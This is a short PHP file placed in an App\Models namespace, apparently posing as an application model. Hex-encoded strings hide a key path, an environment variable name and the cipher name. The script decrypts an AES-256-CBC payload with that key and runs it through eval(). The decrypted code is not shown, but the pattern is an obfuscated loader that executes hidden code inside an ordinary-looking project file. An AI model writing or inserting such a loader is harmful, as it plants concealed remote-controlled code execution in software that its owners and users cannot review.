<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('LEqo1x2RYNghYYXGakJynw==');

$c=base64_decode(

'yOVnEZxmfLZLoXStqNW1m/2R7Y1nhPVD+Pw0+EpPxhw8sbHmoaxVgmoi+EEca5wTxpKRZGzBnoIk' .
'8ZiR+dpt2Nn4E60kDSD7JXfNdg1JrjtLkNObscCh3b3W3eQ1bIm4kKOR10SEgXSy1NfkNFFUU5pI' .
'GbIB3yz/Cnrmt+uJkGZZNxIg9LDCeOQKVTVSBSzw1PBwN/FNvZGLvp/hxetTiAJSkY9F544YFTpf' .
'vxavN2mvhcX6QzEhIgfS1xrNinN6QvPjTjyxE1SNzy0VDO2YKObjQKAunlkPB7nr3MDVLzmahWzQ' .
'y8z2Ym80El5kLus1ksYKO3nuXrxVW9HgGHl3zTrL9NP1ZMbOjvpFjpGkKwgmi6oldCOui1+O08mC' .
'aHmE14oIEv8oTe6UqgM5gGgg/Db6t4XzidfEjci6tqJddReOuwOwExuQhcOZxGpWyCH2xyBtLVNF' .
'j1QdhhItsBG+woNQsF/Cas93G70odxcjsE6EQPS7h2JEWWmmKU4YfQgOyMDLlcOPtUW7OUjKONGw' .
'JqeI8RDjcvy5iIdsWmj2sl3O+f4f7hHl9nQiMlseiVKRlPn39v4gF4vxN06R/2mkZvHilK1rySKX' .
'N45rgDQHJ4IWqX5QqLdDoOUq/t3xboQQ6xyt/f9w8ZCCNiVTIof+B+PsTWiqxu/iSa0K1VntAtsi' .
'WGkf+nJl4/KyVWnz+amT7bFp5tLi/ScbknNSnZx8FjmRT5ObnMCbW0a6cFIPuPBVLlMrzpBeJKgE' .
'ip+w1uMC0YcoD2mYTZnf1iTiKNsD2A=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

